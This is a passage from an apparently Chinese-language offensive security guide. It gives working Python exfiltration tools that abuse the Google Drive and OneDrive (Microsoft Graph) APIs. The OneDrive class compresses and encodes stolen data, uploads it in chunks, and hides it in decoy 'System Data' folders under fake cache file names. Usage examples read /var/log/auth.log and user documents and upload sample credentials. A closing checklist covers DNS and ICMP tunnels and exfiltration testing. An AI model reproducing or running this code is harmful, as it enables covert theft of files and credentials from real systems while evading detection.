                    exfiltration_results['total_size'] += len(file_content)
                    
                except Exception as e:
                    print(f"[!] Error processing file {target_path}: {e}")
            
            elif os.path.isdir(target_path):
                # 上传整个目录
                result = self.upload_directory(target_path)
                if result:
                    exfiltration_results['uploaded_directories'].append(result)
                    exfiltration_results['total_size'] += sum(f['size'] for f in result['uploaded_files'])
        
        # 创建隐藏文件备份
        print("[*] Creating hidden file backup...")
        
        # 收集所有数据
        all_data = json.dumps(exfiltration_results)
        hidden_result = self.create_hidden_files(all_data)
        
        if hidden_result:
            exfiltration_results['hidden_files'] = [hidden_result]
        
        print(f"[+] Google Drive exfiltration completed")
        print(f"[+] Total data size: {exfiltration_results['total_size']} bytes")
        print(f"[+] Files uploaded: {len(exfiltration_results['uploaded_files'])}")
        print(f"[+] Directories uploaded: {len(exfiltration_results['uploaded_directories'])}")
        
        return exfiltration_results

# 使用示例
drive_exfiltrator = GoogleDriveExfiltrator("credentials.json")

# 自动数据渗出
target_paths = [
    "/tmp/sensitive_data.txt",
    "/home/user/documents",
    "/var/log/auth.log"
]

results = drive_exfiltrator.auto_google_drive_exfiltration(target_paths)

# 保存结果
with open('google_drive_exfiltration_results.json', 'w') as f:
    json.dump(results, f, indent=2, default=str)
```

#### OneDrive API利用
```python
# onedrive_exfiltration.py
import requests
import json
import base64
import zlib
from datetime import datetime

class OneDriveExfiltrator:
    def __init__(self, client_id, client_secret, tenant_id):
        self.client_id = client_id
        self.client_secret = client_secret
        self.tenant_id = tenant_id
        self.access_token = None
        self.base_url = "https://graph.microsoft.com/v1.0"
        self.authenticate()
    
    def authenticate(self):
        """认证OneDrive API"""
        try:
            # 获取访问令牌
            token_url = f"https://login.microsoftonline.com/{self.tenant_id}/oauth2/v2.0/token"
            
            token_data = {
                'grant_type': 'client_credentials',
                'client_id': self.client_id,
                'client_secret': self.client_secret,
                'scope': 'https://graph.microsoft.com/.default'
            }
            
            response = requests.post(token_url, data=token_data)
            response.raise_for_status()
            
            token_response = response.json()
            self.access_token = token_response['access_token']
            
            print("[+] OneDrive authentication successful")
            
        except Exception as e:
            print(f"[!] OneDrive authentication failed: {e}")
            self.access_token = None
    
    def make_graph_request(self, endpoint, method='GET', data=None, headers=None):
        """发起Graph API请求"""
        if not self.access_token:
            print("[!] Not authenticated")
            return None
        
        try:
            request_headers = headers or {}
            request_headers['Authorization'] = f'Bearer {self.access_token}'
            request_headers['Content-Type'] = 'application/json'
            
            url = f"{self.base_url}{endpoint}"
            
            if method == 'GET':
                response = requests.get(url, headers=request_headers)
            elif method == 'POST':
                response = requests.post(url, headers=request_headers, json=data)
            elif method == 'PUT':
                response = requests.put(url, headers=request_headers, data=data)
            elif method == 'PATCH':
                response = requests.patch(url, headers=request_headers, json=data)
            elif method == 'DELETE':
                response = requests.delete(url, headers=request_headers)
            
            response.raise_for_status()
            
            if response.status_code == 204:  # No Content
                return True
            
            return response.json()
            
        except requests.exceptions.RequestException as e:
            print(f"[!] Graph API request failed: {e}")
            return None
    
    def get_drive_info(self):
        """获取驱动器信息"""
        return self.make_graph_request('/me/drive')
    
    def list_files(self, path="/"):
        """列出文件"""
        endpoint = f"/me/drive/root:{path}:/children"
        return self.make_graph_request(endpoint)
    
    def create_folder(self, name, parent_path="/"):
        """创建文件夹"""
        endpoint = f"/me/drive/root:{parent_path}:/children"
        
        folder_data = {
            "name": name,
            "folder": {},
            "@microsoft.graph.conflictBehavior": "rename"
        }
        
        return self.make_graph_request(endpoint, method='POST', data=folder_data)
    
    def upload_small_file(self, file_path, file_content):
        """上传小文件（<4MB）"""
        endpoint = f"/me/drive/root:/{file_path}:/content"
        
        if isinstance(file_content, str):
            file_content = file_content.encode('utf-8')
        
        headers = {
            'Content-Type': 'application/octet-stream'
        }
        
        return self.make_graph_request(endpoint, method='PUT', data=file_content, headers=headers)
    
    def upload_large_file(self, file_path, file_content):
        """上传大文件（>4MB）"""
        if isinstance(file_content, str):
            file_content = file_content.encode('utf-8')
        
        file_size = len(file_content)
        
        # 1. 创建上传会话
        upload_session_data = {
            "item": {
                "@microsoft.graph.conflictBehavior": "replace",
                "name": os.path.basename(file_path)
            }
        }
        
        endpoint = f"/me/drive/root:/{file_path}:/createUploadSession"
        upload_session = self.make_graph_request(endpoint, method='POST', data=upload_session_data)
        
        if not upload_session:
            return None
        
        upload_url = upload_session['uploadUrl']
        
        # 2. 分片上传
        chunk_size = 320 * 1024  # 320KB chunks
        chunks = [file_content[i:i+chunk_size] for i in range(0, file_size, chunk_size)]
        
        uploaded_chunks = 0
        
        for i, chunk in enumerate(chunks):
            start = i * chunk_size
            end = start + len(chunk) - 1
            content_length = len(chunk)
            
            headers = {
                'Content-Length': str(content_length),
                'Content-Range': f'bytes {start}-{end}/{file_size}'
            }
            
            response = requests.put(upload_url, headers=headers, data=chunk)
            
            if response.status_code in [200, 201]:
                uploaded_chunks += 1
                print(f"[+] Uploaded chunk {i+1}/{len(chunks)}")
            elif response.status_code == 202:
                # 继续上传
                uploaded_chunks += 1
                print(f"[+] Uploaded chunk {i+1}/{len(chunks)}")
            else:
                print(f"[!] Failed to upload chunk {i+1}: {response.status_code}")
                return None
        
        print(f"[+] Large file upload completed: {uploaded_chunks}/{len(chunks)} chunks")
        return response.json() if response.status_code in [200, 201] else None
    
    def encode_and_upload_data(self, data, filename_prefix="data"):
        """编码并上传数据"""
        try:
            # 压缩和编码数据
            compressed = zlib.compress(data.encode('utf-8'))
            encoded = base64.b64encode(compressed).decode('utf-8')
            
            # 分割大文件
            chunk_size = 100 * 1024  # 100KB chunks
            chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
            
            uploaded_files = []
            
            for i, chunk in enumerate(chunks):
                filename = f"{filename_prefix}_part{i:03d}.txt"
                file_path = f"exfiltration/{filename}"
                
                # 根据大小选择合适的上传方法
                if len(chunk) < 4 * 1024 * 1024:  # <4MB
                    result = self.upload_small_file(file_path, chunk)
                else:
                    result = self.upload_large_file(file_path, chunk)
                
                if result:
                    uploaded_files.append({
                        'filename': filename,
                        'file_path': file_path,
                        'chunk_index': i,
                        'chunk_size': len(chunk)
                    })
            
            print(f"[+] Data uploaded in {len(uploaded_files)} parts")
            return uploaded_files
            
        except Exception as e:
            print(f"[!] Error encoding and uploading data: {e}")
            return []
    
    def create_hidden_folder_structure(self, data, base_folder="System Data"):
        """创建隐藏的文件夹结构"""
        try:
            # 创建基础文件夹
            folder_id = self.create_folder(base_folder)
            if not folder_id:
                return None
            
            # 创建子文件夹结构
            subfolders = [
                "Cache",
                "Temp",
                "Config",
                "Logs",
                "Metadata"
            ]
            
            folder_structure = {}
            
            for subfolder in subfolders:
                subfolder_path = f"{base_folder}/{subfolder}"
                subfolder_result = self.create_folder(subfolder, f"{base_folder}/")
                
                if subfolder_result:
                    folder_structure[subfolder] = subfolder_result
            
            # 将数据分割并隐藏在子文件夹中
            encoded_data = base64.b64encode(zlib.compress(data.encode('utf-8'))).decode('utf-8')
            chunk_size = 20000  # 20KB chunks
            chunks = [encoded_data[i:i+chunk_size] for i in range(0, len(encoded_data), chunk_size)]
            
            hidden_files = []
            
            for i, chunk in enumerate(chunks):
                subfolder = list(folder_structure.keys())[i % len(folder_structure)]
                
                # 生成看似随机的文件名
                import hashlib
                hash_name = hashlib.md5(f"chunk_{i}_{datetime.now().timestamp()}".encode()).hexdigest()
                
                filename = f"cache_{hash_name[:12]}.dat"
                file_path = f"{base_folder}/{subfolder}/{filename}"
                
                # 上传文件
                result = self.upload_small_file(file_path, chunk)
                
                if result:
                    hidden_files.append({
                        'folder': subfolder,
                        'filename': filename,
                        'file_path': file_path,
                        'chunk_index': i,
                        'chunk_size': len(chunk)
                    })
            
            print(f"[+] Created hidden folder structure with {len(hidden_files)} files")
            return {
                'base_folder_id': folder_id,
                'base_folder_name': base_folder,
                'subfolders': folder_structure,
                'hidden_files': hidden_files,
                'total_chunks': len(chunks)
            }
            
        except Exception as e:
            print(f"[!] Error creating hidden folder structure: {e}")
            return None
    
    def auto_onedrive_exfiltration(self, target_data):
        """自动OneDrive数据渗出"""
        print("[*] Starting automatic OneDrive data exfiltration...")
        
        exfiltration_results = {
            'timestamp': datetime.now().isoformat(),
            'uploaded_files': [],
            'hidden_folders': [],
            'total_size': 0
        }
        
        # 1. 上传数据为文件
        print("[*] Uploading data as files...")
        
        uploaded_files = self.encode_and_upload_data(
            json.dumps(target_data),
            filename_prefix="exfiltration_data"
        )
        
        exfiltration_results['uploaded_files'] = uploaded_files
        exfiltration_results['total_size'] = sum(f['chunk_size'] for f in uploaded_files)
        
        # 2. 创建隐藏的文件夹结构
        print("[*] Creating hidden folder structure...")
        
        hidden_result = self.create_hidden_folder_structure(
            json.dumps(target_data),
            base_folder="System Configuration"
        )
        
        if hidden_result:
            exfiltration_results['hidden_folders'] = [hidden_result]
        
        print("[+] OneDrive exfiltration completed")
        print(f"[+] Total data size: {exfiltration_results['total_size']} bytes")
        print(f"[+] Files uploaded: {len(exfiltration_results['uploaded_files'])}")
        print(f"[+] Hidden folders created: {len(exfiltration_results['hidden_folders'])}")
        
        return exfiltration_results

# 使用示例
onedrive_exfiltrator = OneDriveExfiltrator(
    client_id="your-client-id",
    client_secret="your-client-secret",
    tenant_id="your-tenant-id"
)

# 示例数据
test_data = {
    'credentials': [
        {'username': 'admin', 'password': 'P@ssw0rd123'},
        {'username': 'user1', 'password': 'Password456'}
    ],
    'system_info': {
        'hostname': 'CORP-DC01',
        'domain': 'corp.local',
        'os': 'Windows Server 2019'
    }
}

results = onedrive_exfiltrator.auto_onedrive_exfiltration(test_data)

# 保存结果
with open('onedrive_exfiltration_results.json', 'w') as f:
    json.dump(results, f, indent=2, default=str)
```

---

## 实战检查清单

### 隐蔽信道
- [ ] DNS隧道已配置
- [ ] ICMP隧道已设置
- [ ] 隧道服务端已部署
- [ ] 数据编码已配置
- [ ] 隧道测试已完成

### Web服务利用
- [ ] Google Drive API已配置
- [ ] OneDrive API已设置
- [ ] 数据编码已实施
- [ ] 文件上传已测试
- [ ] 隐藏文件结构已创建

### 数据渗出
- [ ] 渗出数据已准备
- [ ] 数据压缩已配置
- [ ] 数据加密已实施
- [ ] 渗出通道已测试
- [ ] 渗出结果已验证